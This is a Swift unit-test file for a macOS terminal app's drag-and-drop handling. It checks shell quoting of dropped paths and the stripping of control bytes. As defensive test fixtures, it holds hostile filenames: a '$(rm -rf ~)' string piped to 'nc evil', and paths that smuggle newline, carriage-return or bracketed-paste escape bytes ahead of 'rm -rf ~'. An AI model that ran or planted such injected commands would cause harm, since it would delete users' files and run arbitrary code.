import XCTest
import AppKit
@testable import Blackbird

final class DragDropTests: XCTestCase {
    /// `shellQuote` wraps a path in single quotes and escapes embedded singles.
    func testShellQuoteSimple() {
        XCTAssertEqual(TerminalView.shellQuote("/Users/foo/bar.png"),
                       "'/Users/foo/bar.png'")
    }

    func testShellQuoteWithSpaces() {
        XCTAssertEqual(TerminalView.shellQuote("/Users/foo/my image.png"),
                       "'/Users/foo/my image.png'")
    }

    func testShellQuoteWithEmbeddedSingleQuote() {
        // Classic POSIX recipe: close quote, escaped single, reopen.
        XCTAssertEqual(TerminalView.shellQuote("/tmp/don't.txt"),
                       "'/tmp/don'\\''t.txt'")
    }

    func testJoinedMultiFile() {
        let joined = TerminalView.joinedDroppedPaths([
            "/a/one.png",
            "/b/two three.png",
        ])
        XCTAssertEqual(joined, "'/a/one.png' '/b/two three.png'")
    }

    func testShellQuoteRejectsShellMetachars() {
        // Filenames can technically contain backticks, dollar signs,
        // semicolons, pipes. Single-quote wrapping neutralises all of
        // them — test verifies the quoter doesn't collapse anything.
        let name = "$(rm -rf ~) ; echo `whoami` | nc evil 1234"
        let quoted = TerminalView.shellQuote(name)
        // Metachars pass through literally; the outer single quotes
        // turn them into plain characters for the shell.
        XCTAssertTrue(quoted.hasPrefix("'"))
        XCTAssertTrue(quoted.hasSuffix("'"))
        XCTAssertTrue(quoted.contains("$(rm -rf ~)"))
    }

    func testShellQuote_emptyString() {
        // An empty-string path (edge-case from misbehaving
        // NSPasteboard reader) becomes just `''` — harmless when
        // pasted into the shell as a positional arg.
        XCTAssertEqual(TerminalView.shellQuote(""), "''")
    }

    func testJoinedDroppedPaths_emptyArray() {
        XCTAssertEqual(TerminalView.joinedDroppedPaths([]), "")
    }

    func testJoinedDroppedPaths_singleFile() {
        XCTAssertEqual(
            TerminalView.joinedDroppedPaths(["/only/one.txt"]),
            "'/only/one.txt'"
        )
    }

    // MARK: - Drop integration regressions
    //
    // Bug #19 / #20 / #21 cover the `performDragOperation` glue, not the
    // pure `shellQuote` / `joinedDroppedPaths` formatters above. The view
    // exposes `performDropOfPaths` as a test seam (NSDraggingInfo isn't
    // mockable: AppKit treats it specially and synthesised conformers
    // crash on the framework's internal `_concreteDraggingInfo` lookup),
    // and `pasteTextRecorderForTests` captures the pre-encoding string
    // the paste pipeline saw so we can assert quoting end-to-end.

    /// Regression: a drop while the shell has an active foreground
    /// child (claude, python, psql, vim, …) must be forwarded to that
    /// child, not refused. An earlier revision (Bug #19) gated drops on
    /// `hasForegroundChild()` and broke every interactive REPL — most
    /// painfully Claude Code, where dragging in an image path is a
    /// primary workflow. Terminal.app and iTerm2 both forward; we do
    /// too.
    func test_drop_duringForegroundCommand_accepted() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        session._testForegroundChildOverride = true
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        let accepted = view.performDropOfPaths(["/tmp/example.txt"])

        XCTAssertTrue(accepted, "drop must be forwarded to the running command")
        XCTAssertEqual(pastes, ["'/tmp/example.txt'"],
                       "the quoted path should reach the paste pipeline regardless of foreground child state")
    }

    /// Baseline: with no foreground child, the drop is accepted by the
    /// shell. Pairs with the regression above — verifies behaviour is
    /// identical whether or not a child is running.
    func test_drop_withoutForegroundCommand_accepted() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        session._testForegroundChildOverride = false
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        let accepted = view.performDropOfPaths(["/tmp/example.txt"])

        XCTAssertTrue(accepted)
        XCTAssertEqual(pastes, ["'/tmp/example.txt'"])
    }

    /// Bug #20: paths with shell metacharacters (spaces, $, backticks,
    /// quotes) must be single-quote-wrapped before reaching the shell.
    /// This is the integration check on top of `testShellQuoteWithSpaces`
    /// — verifies the wrapping happens through the drop entry point too,
    /// not just in the pure helper.
    func test_drop_quotesPathWithSpaces() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        view.performDropOfPaths(["/tmp/has spaces.txt"])

        XCTAssertEqual(pastes, ["'/tmp/has spaces.txt'"])
    }

    /// Bug #20 hardening: a path containing a single quote round-trips
    /// through the POSIX `'\''` recipe so the shell parses it as one
    /// argument, not two.
    func test_drop_quotesPathWithEmbeddedSingleQuote() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        view.performDropOfPaths(["/tmp/don't.txt"])

        XCTAssertEqual(pastes, ["'/tmp/don'\\''t.txt'"])
    }

    /// Bug #21: a drop must clear any in-flight IME composition before
    /// the path bytes leave for the PTY. Otherwise the preedit overlay
    /// hangs over the freshly-pasted text and the next IME keystroke
    /// commits the stale composition on top of the path.
    func test_drop_cancelsActiveIMEComposition() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        // Install a preedit composition the way a real IME would —
        // setMarkedText is the sanctioned entry point and sets up
        // `view.composition` plus the overlay subview.
        view.setMarkedText("か",
                           selectedRange: NSRange(location: 1, length: 0),
                           replacementRange: NSRange(location: NSNotFound, length: 0))
        XCTAssertTrue(view.hasMarkedText(), "precondition: composition is active")

        view.performDropOfPaths(["/tmp/file.txt"])

        XCTAssertFalse(view.hasMarkedText(),
                       "drop must clear the IME preedit before pasting bytes")
    }

    // MARK: - Drop-path control-byte scrub (CVE-class)
    //
    // HFS+/APFS filenames legally contain C0 controls (LF, CR, ESC, …).
    // A hostile pasteboard provider — sandboxed peer app, NSPasteboard
    // synthesiser, or any process with the right entitlement — can hand
    // us a `file://` URL whose path embeds those bytes. `shellQuote`
    // wraps in single quotes but does NOT remove embedded controls;
    // the post-quote `pasteText` pipeline whitelists 0x0A / 0x0D as
    // legitimate paste (correct for user-typed paste from pbpaste-
    // style flows) and `convertLoneCRToLF` preserves the LF, so a
    // drop of `/tmp/x\nrm -rf ~` reaches the shell as Enter →
    // arbitrary command execution.
    //
    // Memory cost: each test allocates a single TerminalView + headless
    // session and one short-string paste; trivial — well under a kB.

    /// Embedded LF in a dropped URL's path must NOT survive into the
    /// paste payload. If 0x0A reached the shell at a bare prompt, the
    /// bytes after the newline would execute as a fresh command — one
    /// drag, arbitrary command execution.
    func test_drop_stripsEmbeddedLF_fromPath() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        // URL(fileURLWithPath:) accepts embedded LF — HFS+ filenames
        // legally contain it. `.path` round-trips the byte intact, so
        // this matches what a hostile pasteboard provider would deliver
        // through `readObjects(forClasses: [NSURL.self], ...)`.
        let hostile = URL(fileURLWithPath: "/tmp/x\nrm -rf ~")
        view.performDropOfPaths([Self.sanitizedDropPath(from: hostile)])

        XCTAssertEqual(pastes.count, 1, "exactly one paste should be issued")
        let payload = pastes[0]
        XCTAssertFalse(payload.unicodeScalars.contains(where: { $0.value == 0x0A }),
                       "LF (0x0A) must be stripped from dropped URL paths before quoting")
        XCTAssertFalse(payload.unicodeScalars.contains(where: { $0.value == 0x0D }),
                       "CR (0x0D) must not appear either")
    }

    /// Symmetric to the LF case: a CR byte (0x0D) embedded in a dropped
    /// URL path would survive `shellQuote`, then be turned into LF by
    /// `convertLoneCRToLF` in the non-bracketed paste path — same RCE.
    /// Strip CR for the same reason and at the same layer.
    func test_drop_stripsEmbeddedCR_fromPath() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        let hostile = URL(fileURLWithPath: "/tmp/x\rrm -rf ~")
        view.performDropOfPaths([Self.sanitizedDropPath(from: hostile)])

        XCTAssertEqual(pastes.count, 1)
        let payload = pastes[0]
        XCTAssertFalse(payload.unicodeScalars.contains(where: { $0.value == 0x0D }),
                       "CR (0x0D) must be stripped from dropped URL paths before quoting")
        XCTAssertFalse(payload.unicodeScalars.contains(where: { $0.value == 0x0A }),
                       "no LF should be introduced either (would be created by the CR→LF converter downstream)")
    }

    /// ESC (0x1B) embedded in a dropped path would re-introduce the
    /// paste-injection class fixed by `sanitizeBracketedPaste`: an
    /// attacker emits a path containing `ESC[201~ rm -rf ~` to close
    /// the bracketed-paste window early and execute the trailing
    /// bytes. The drop layer is the right place to catch this — once
    /// the ESC reaches the paste pipeline the shellQuote single-quote
    /// wrap doesn't help (the ESC byte is preserved verbatim).
    func test_drop_stripsEmbeddedESC_fromPath() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        let hostile = URL(fileURLWithPath: "/tmp/x\u{001B}[201~rm -rf ~")
        view.performDropOfPaths([Self.sanitizedDropPath(from: hostile)])

        XCTAssertEqual(pastes.count, 1)
        let payload = pastes[0]
        XCTAssertFalse(payload.unicodeScalars.contains(where: { $0.value == 0x1B }),
                       "ESC (0x1B) must be stripped from dropped URL paths before quoting")
    }

    /// Belt-and-braces unit check on the helper itself: every C0 byte
    /// (0x00–0x1F) plus DEL (0x7F) must be removed; printable bytes
    /// pass through unchanged.
    func test_sanitizeDropPath_stripsC0AndDEL() {
        let raw = "/a\u{0000}b\u{0009}c\u{000A}d\u{000D}e\u{001B}f\u{001F}g\u{007F}h"
        let scrubbed = TerminalView.sanitizeDropPath(raw)
        for scalar in scrubbed.unicodeScalars {
            XCTAssertFalse(scalar.value < 0x20 || scalar.value == 0x7F,
                           "C0/DEL byte 0x\(String(scalar.value, radix: 16)) survived sanitizeDropPath")
        }
        XCTAssertEqual(scrubbed, "/abcdefgh",
                       "non-control bytes must pass through untouched, in order")
    }

    /// Helper: take the same code path as `performDragOperation` —
    /// `url.path` -> `sanitizeDropPath` — so the integration tests
    /// above exercise the production scrubber rather than re-implementing
    /// it inline. Keeps the scrub policy in one place.
    private static func sanitizedDropPath(from url: URL) -> String {
        TerminalView.sanitizeDropPath(url.path)
    }
}
